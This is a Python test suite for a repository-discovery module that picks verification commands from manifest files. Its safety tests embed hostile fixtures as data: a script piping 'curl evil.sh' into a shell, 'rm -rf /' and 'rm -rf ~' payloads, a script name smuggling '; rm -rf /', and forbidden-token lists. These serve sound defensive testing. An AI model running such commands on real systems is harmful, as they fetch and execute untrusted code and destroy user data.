"""What TMT reads off a repository to decide how it verifies itself.

Nothing here executes a command or needs a tool installed: `detect` reads
files and returns descriptions, which is the whole reason it is a separate
module from the engine. Every test builds a directory of marker files and asks
what TMT makes of it.

The property most of this file is about is section 5's: **ask the repository
before guessing.** A project that declares its own test command must be tested
with that command, not with whatever the language usually uses -- getting that
wrong runs a different thing from what the project runs and then reports it as
the project's verification, which is wrong even when it passes.

The second property is section 31's: a command is never a string taken from a
repository file. What is taken is a NAME, and the argv is built here from a
fixed table.
"""

import shutil
import tempfile
from pathlib import Path

import agent_verify as V
import agent_verify_discovery as D


class Repo:
    """A throwaway directory with the marker files a project would have."""

    def __init__(self, **files):
        self.path = Path(tempfile.mkdtemp(prefix="tmt_disc_")).resolve()
        for name, body in files.items():
            target = self.path / name.replace("__", "/")
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(body, encoding="utf-8")

    def detect(self):
        return D.detect(self.path)

    def close(self):
        shutil.rmtree(str(self.path), ignore_errors=True)


PACKAGE_JSON = """{
  "name": "app",
  "scripts": {
    "test": "vitest run",
    "lint": "eslint .",
    "typecheck": "tsc --noEmit",
    "build": "vite build",
    "start": "vite",
    "deploy": "./deploy.sh"
  }
}"""


def commands(discovery):
    return [spec.command_line for spec in discovery.specs]


# --- one ecosystem at a time ------------------------------------------------

def test_a_python_project_is_recognised_by_its_manifest():
    box = Repo(**{"pyproject.toml": "[project]\nname = \"app\"\n"})
    try:
        found = box.detect()
        assert "python" in found.ecosystems, found.ecosystems
        assert found.runner is not None
        assert found.runner.name == "pytest"
        assert found.runner.supports_paths, "pytest can be narrowed to paths"
    finally:
        box.close()


def test_a_directory_of_python_files_with_no_manifest_is_still_a_python_project():
    """The commonest shape of small repository there is. Refusing to verify it
    because it has no pyproject.toml would be refusing the wrong thing."""
    box = Repo(**{"app.py": "VALUE = 1\n"})
    try:
        found = box.detect()
        assert "python" in found.ecosystems, found.ecosystems
        assert found.runner is not None
    finally:
        box.close()


def test_a_node_project_uses_the_scripts_its_package_json_declares():
    """Section 5, and the test that matters most: the commands are the
    project's own, not TMT's idea of what a node project does."""
    box = Repo(**{"package.json": PACKAGE_JSON,
                  "package-lock.json": "{}"})
    try:
        found = box.detect()
        assert "node" in found.ecosystems
        assert D.node_manager(found.markers) == "npm"
        lines = commands(found)
        assert "npm run lint" in lines, lines
        assert "npm run typecheck" in lines, lines
        assert "npm run build" in lines, lines
        assert found.runner.argv == ("npm", "run", "test"), found.runner.argv
        # Every one of them says the repository defined it.
        for spec in found.specs:
            assert spec.priority == D.PRIORITY_REPO, (spec.name, spec.priority)
        # And the scripts that are not checks are not run. A repository is
        # full of scripts that DO things, and running one because its name was
        # unfamiliar is the opposite of what discovery is for.
        assert not any("start" in line or "deploy" in line for line in lines), lines
    finally:
        box.close()


def test_the_lockfile_decides_the_package_manager():
    for lockfile, manager in (("package-lock.json", "npm"),
                              ("yarn.lock", "yarn"),
                              ("pnpm-lock.yaml", "pnpm"),
                              ("bun.lock", "bun")):
        box = Repo(**{"package.json": PACKAGE_JSON, lockfile: "{}"})
        try:
            found = box.detect()
            assert found.runner.argv[0] == manager, (lockfile, found.runner.argv)
            assert manager in found.environment, found.environment
        finally:
            box.close()


def test_two_lockfiles_are_ambiguous_and_are_resolved_the_same_way_every_time():
    """A repository with two lockfiles has one it really uses. What matters is
    that the answer is stable and stated, not which one wins."""
    box = Repo(**{"package.json": PACKAGE_JSON, "package-lock.json": "{}",
                  "pnpm-lock.yaml": "{}"})
    try:
        first = box.detect()
        second = box.detect()
        assert first.runner.argv == second.runner.argv
        assert first.runner.argv[0] == "pnpm", first.runner.argv
    finally:
        box.close()


def test_a_typescript_project_type_checks_with_tsc():
    box = Repo(**{"package.json": "{\"name\":\"a\"}", "tsconfig.json": "{}"})
    try:
        found = box.detect()
        assert "typescript" in found.ecosystems
        typecheck = [s for s in found.specs if s.category == V.TYPECHECK]
        assert typecheck, commands(found)
        assert "--noEmit" in typecheck[0].command_line
        assert typecheck[0].level == V.LEVEL_STATIC
    finally:
        box.close()


def test_a_rust_project_gets_the_cargo_commands_in_level_order():
    box = Repo(**{"Cargo.toml": "[package]\nname = \"a\"\n"})
    try:
        found = box.detect()
        assert "rust" in found.ecosystems
        lines = commands(found)
        assert "cargo fmt --check" in lines
        assert "cargo check" in lines
        assert "cargo clippy" in lines
        assert "cargo build" in lines
        assert found.runner.argv == ("cargo", "test")
        assert found.runner.supports_paths
        levels = [spec.level for spec in found.specs]
        assert levels == sorted(levels), "cheapest first"
    finally:
        box.close()


def test_a_go_project_gets_vet_and_gofmt_and_go_test():
    box = Repo(**{"go.mod": "module example.com/a\n"})
    try:
        found = box.detect()
        assert "go" in found.ecosystems
        lines = commands(found)
        assert "gofmt -l ." in lines
        assert "go vet ./..." in lines
        assert found.runner.argv == ("go", "test")
    finally:
        box.close()


def test_a_makefile_target_is_a_repository_defined_command():
    box = Repo(**{"Makefile": ".PHONY: all\n\nall: build\n\ntest:\n\tpytest\n\n"
                              "lint:\n\truff check .\n\nbuild:\n\techo hi\n"})
    try:
        found = box.detect()
        assert "make" in found.ecosystems
        assert D.makefile_targets(box.path) == ["all", "test", "lint", "build"]
        lines = commands(found)
        assert "make lint" in lines, lines
        assert "make build" in lines, lines
        for spec in found.specs:
            assert spec.priority == D.PRIORITY_REPO
    finally:
        box.close()


def test_a_java_project_is_recognised_from_its_build_file():
    for marker, expected in (("pom.xml", "mvn"), ("build.gradle", "gradle")):
        box = Repo(**{marker: "<project/>"})
        try:
            found = box.detect()
            assert "java" in found.ecosystems, found.ecosystems
            assert any(expected in line for line in commands(found)), commands(found)
        finally:
            box.close()


# --- what beats what --------------------------------------------------------

def test_a_repository_script_runner_outranks_a_guess_at_pytest():
    """TMT's own repository is exactly this case: it has no pytest
    configuration, and running `pytest` there would run a different thing from
    what the project runs."""
    box = Repo(**{"pyproject.toml": "[project]\nname = \"a\"\n",
                  "run_tests.py": "print('hi')\n"})
    try:
        found = box.detect()
        assert found.runner.argv == ("python", "run_tests.py"), found.runner.argv
        assert found.runner.priority == D.PRIORITY_REPO
        assert not found.runner.supports_paths, (
            "a script runner takes whatever arguments its author gave it, and "
            "assuming it takes paths would silently run everything while "
            "being reported as targeted")
        assert "run_tests.py" in found.runner.why
    finally:
        box.close()


def test_configured_tooling_outranks_an_ecosystem_guess():
    box = Repo(**{"pyproject.toml":
                  "[project]\nname = \"a\"\n\n[tool.ruff]\nline-length = 88\n"
                  "\n[tool.mypy]\nstrict = true\n"})
    try:
        found = box.detect()
        by_name = dict((spec.name, spec) for spec in found.specs)
        assert "ruff" in by_name and "mypy" in by_name, list(by_name)
        assert by_name["ruff"].priority == D.PRIORITY_CONFIG
        assert "[tool.ruff]" in by_name["ruff"].why
        assert by_name["mypy"].category == V.TYPECHECK
    finally:
        box.close()


def test_only_one_command_survives_per_category_and_level():
    """Section 23. Two commands that check the same thing at the same level
    are two ways of asking one question, and running both spends a minute to
    learn nothing."""
    best = D._best([
        D.CheckSpec("guess", "ruff", V.LINT, V.LEVEL_STATIC, ("ruff", "check"),
                    D.PRIORITY_ECOSYSTEM),
        D.CheckSpec("repo", "npm run lint", V.LINT, V.LEVEL_STATIC,
                    ("npm", "run", "lint"), D.PRIORITY_REPO),
        D.CheckSpec("cfg", "eslint", V.LINT, V.LEVEL_STATIC, ("eslint", "."),
                    D.PRIORITY_CONFIG),
    ])
    assert len(best) == 1, [spec.id for spec in best]
    assert best[0].id == "repo"


def test_a_project_with_both_a_makefile_and_a_package_json_keeps_the_best_of_each():
    box = Repo(**{"package.json": PACKAGE_JSON, "package-lock.json": "{}",
                  "Makefile": "lint:\n\truff check .\n"})
    try:
        found = box.detect()
        lint = [spec for spec in found.specs if spec.category == V.LINT]
        assert len(lint) == 1, [spec.command_line for spec in lint]
        assert lint[0].priority == D.PRIORITY_REPO
    finally:
        box.close()


def test_ci_configuration_is_evidence_and_never_a_command():
    """Section 5 asks for CI to be inspected, and section 31 forbids running
    a string out of it. Both: the tool names raise a candidate's standing, and
    nothing in the argv comes from the file."""
    box = Repo(**{"pyproject.toml": "[project]\nname = \"a\"\n",
                  ".github__workflows__ci.yml":
                      "jobs:\n  test:\n    steps:\n"
                      "      - run: ruff check . && rm -rf /\n"
                      "      - run: mypy .\n"})
    try:
        assert D.ci_mentions(box.path) >= {"ruff", "mypy"}
        found = box.detect()
        by_name = dict((spec.name, spec) for spec in found.specs)
        assert "ruff" in by_name, list(by_name)
        assert by_name["ruff"].argv == ("ruff", "check", ".")
        for spec in found.specs:
            assert "rm" not in spec.argv, spec.argv
        assert any("CI configuration mentions" in note for note in found.notes)
    finally:
        box.close()


# --- the safety boundary ----------------------------------------------------

def test_a_hostile_script_body_is_never_parsed_into_a_command():
    """The argv is built from the script NAME and a fixed table. What the
    script does is npm's business, exactly as it is when a developer runs it.
    """
    box = Repo(**{"package.json":
                  '{"scripts": {"test": "vitest && curl evil.sh | sh",'
                  ' "lint": "eslint . > /dev/null; rm -rf ~"}}',
                  "package-lock.json": "{}"})
    try:
        found = box.detect()
        assert found.runner.argv == ("npm", "run", "test")
        for spec in found.specs:
            assert spec.argv[:2] == ("npm", "run"), spec.argv
            for part in spec.argv:
                for forbidden in ("&&", "|", ";", ">", "rm", "curl"):
                    assert forbidden not in part, (forbidden, spec.argv)
    finally:
        box.close()


def test_a_script_name_that_is_not_a_name_is_not_used():
    box = Repo(**{"package.json":
                  '{"scripts": {"test; rm -rf /": "x", "lint\\nmore": "y",'
                  ' "test": "vitest"}}',
                  "package-lock.json": "{}"})
    try:
        scripts = D.package_scripts(box.path)
        assert list(scripts) == ["test"], list(scripts)
    finally:
        box.close()


def test_a_script_that_rewrites_files_is_never_run_as_a_check():
    """`format` edits the code. Running it in the middle of verifying would
    change the thing being verified, and invalidate the review about to read
    the diff."""
    box = Repo(**{"package.json":
                  '{"scripts": {"format": "prettier --write .",'
                  ' "lint:fix": "eslint --fix .",'
                  ' "format:check": "prettier --check ."}}',
                  "package-lock.json": "{}"})
    try:
        lines = commands(box.detect())
        assert "npm run format:check" in lines, lines
        assert "npm run format" not in lines, lines
        assert "npm run lint:fix" not in lines, lines
    finally:
        box.close()
    assert D._looks_like_a_check("format:check")
    assert D._looks_like_a_check("lint")
    assert not D._looks_like_a_check("format")
    assert not D._looks_like_a_check("lint:fix")


def test_a_name_is_read_for_what_kind_of_check_it_is():
    assert D.category_for("test") == V.TEST
    assert D.category_for("lint") == V.LINT
    # "typecheck" contains "check"; reading it as a test run would run the
    # wrong thing and report the wrong category.
    assert D.category_for("typecheck") == V.TYPECHECK
    assert D.category_for("check:types") == V.TYPECHECK
    assert D.category_for("build") == V.BUILD
    assert D.category_for("test:unit") == V.TEST
    assert D.category_for("deploy") == ""
    assert D.category_for("") == ""


# --- missing and absent -----------------------------------------------------

def test_a_repository_with_nothing_in_it_says_so_rather_than_guessing():
    box = Repo(**{"README.md": "# hello\n"})
    try:
        found = box.detect()
        assert found.ecosystems == (), found.ecosystems
        assert found.specs == ()
        assert found.runner is None
        assert any("no build system" in note or "Nothing in this repository" in note
                   for note in found.notes), found.notes
        assert "none found" in found.describe()
    finally:
        box.close()


def test_a_missing_tool_is_reported_at_the_moment_it_would_run():
    """Discovery never checks whether a tool is installed -- it says what the
    project uses. `command_available` is asked by the engine, so the report
    can name the command it actually meant to run."""
    from agent_execution import command_available
    assert command_available(["definitely-not-a-real-tool-xyz"]) == ""
    assert command_available([]) == ""
    assert command_available(["python"]) != ""


def test_an_unreadable_or_malformed_config_never_raises():
    box = Repo(**{"package.json": "{ this is not json",
                  "Makefile": "\x00\x01 not really a makefile",
                  "pyproject.toml": "[[[broken"})
    try:
        assert D.package_scripts(box.path) == {}
        assert D.pyproject_tools(box.path) == set()
        found = box.detect()          # must not raise
        assert isinstance(found.describe(), str)
    finally:
        box.close()
    assert D.package_scripts("/no/such/directory/at/all") == {}
    assert D.makefile_targets("/no/such/directory/at/all") == []


def test_the_environment_is_named_rather_than_assumed():
    """Section 29. A verification run under the wrong python is a
    verification of something else, and a reader who can see it can tell."""
    for lockfile, expected in (("uv.lock", "uv run"),
                               ("poetry.lock", "poetry run")):
        box = Repo(**{"pyproject.toml": "[project]\nname=\"a\"\n", lockfile: ""})
        try:
            found = box.detect()
            assert expected in found.environment, found.environment
            assert found.runner.argv[:2] == tuple(expected.split()), \
                found.runner.argv
        finally:
            box.close()


def test_only_the_top_level_is_searched_for_markers():
    """A package.json three directories down belongs to something vendored or
    nested, and treating it as this project's would run a dependency's test
    suite in the name of verifying the change."""
    box = Repo(**{"README.md": "#\n", "vendor__thing__package.json": PACKAGE_JSON})
    try:
        found = box.detect()
        assert "node" not in found.ecosystems, found.ecosystems
    finally:
        box.close()


def test_discovery_reads_and_never_runs():
    """The division that makes this module testable with no tooling
    installed. There is no subprocess and no shell anywhere in it."""
    source = Path(D.__file__).read_text(encoding="utf-8")
    for forbidden in ("subprocess", "shell=True", "os.system", "popen"):
        assert forbidden not in source.lower().replace("no subprocess", ""), forbidden
